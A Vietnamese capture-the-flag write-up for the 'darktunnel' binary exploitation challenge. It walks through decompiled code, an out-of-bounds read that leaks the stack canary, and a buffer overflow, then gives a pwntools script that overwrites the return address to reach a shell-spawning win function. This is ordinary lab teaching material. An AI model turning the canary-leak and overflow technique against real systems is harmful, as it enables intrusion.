Hướng dẫn cách giải bài darktunnel của giải KCSC-Recruitment-2025

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 28/09/2026

## 1. Mục tiêu

Đầu tiên là đọc code 

```C
void __cdecl __noreturn run()
{
  int v0; // eax
  unsigned __int64 id[3]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  memset(id, 0, 3uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      v0 = menu();
      if ( v0 == 2 )
        break;
      if ( v0 <= 2 )
      {
        if ( !v0 )
          exit(0);
        if ( v0 == 1 )
          input_id(id);
      }
    }
    if ( !id[0] || !id[1] || !id[2] )
    {
      printf("id error !");
      exit(0);
    }
    printf("communication id: ");
    print_id(id);
    printf("communication buffer input start -> ");
    send_buff(id);
  }
}
```

```C
void __cdecl input_id(unsigned __int64 *id)
{
  int i; // [rsp+1Ch] [rbp-4h]

  memset(id, 0, 3uLL);
  for ( i = 0; i <= 3; ++i )
  {
    printf("id %d: ", (unsigned int)i);
    __isoc99_scanf("%lu", &id[i]);      // Lỗi input
  }
}
```

```C
void __cdecl print_id(unsigned __int64 *id)
{
  int i; // [rsp+1Ch] [rbp-4h]

  printf("[ ");
  for ( i = 0; i <= 3; ++i )
    printf("%lu ", id[i]);
  puts(" ]");
}
```

```C
void __cdecl send_buff(unsigned __int64 *id)
{
  int len; // [rsp+18h] [rbp-3F8h]
  int fd; // [rsp+1Ch] [rbp-3F4h]
  char buff[1000]; // [rsp+20h] [rbp-3F0h] BYREF
  unsigned __int64 v4; // [rsp+408h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buff, 0, sizeof(buff));
  __isoc99_scanf("%s", buff);      // BOF
  len = strlen(buff);
  if ( len > 1 )
  {
    fd = open("/tmp/data.rc", 577, 644LL);
    write(fd, buff, len);
  }
}
```

Lỗi đầu tiên là input ở ngay `id`, nếu ta nhập vào dấu `+` thì nó không lấy bất kì thứ gì. Từ đó ta có thể leak được thông qua hàm `print_id`. Ta sẽ leak được Canary và dùng lỗi **Buffer Overflow** ghi đè `RIP` thành `admin` là get shell.

## 2. Cách thực thi
```Python
from pwn import *

p = process('./main')

win = 0x4014d3 + 8

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'id 0: ', b'1')
p.sendlineafter(b'id 1: ', b'1')
p.sendlineafter(b'id 2: ', b'1')
p.sendlineafter(b'id 3: ', b'+')

p.sendlineafter(b'> ', b'2')
p.recvuntil(b'communication id: [ 1 1 1 ')
canary_str = p.recvuntil(b' ', drop=True)
canary = int(canary_str)
log.success(f'Canary : {hex(canary)}')

payload = b'A' * 1000
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(win)
pause()
p.sendlineafter(b'communication buffer input start -> ', payload)

p.interactive()
```

Bài này chỉ có 1 lưu ý là `Alligment` thôi, thay vì nhảy vào đầu `win` thì ta cộng thêm 8 byte vào là được. Bài này khá là basic thôi không có gì quá khó 🐧.
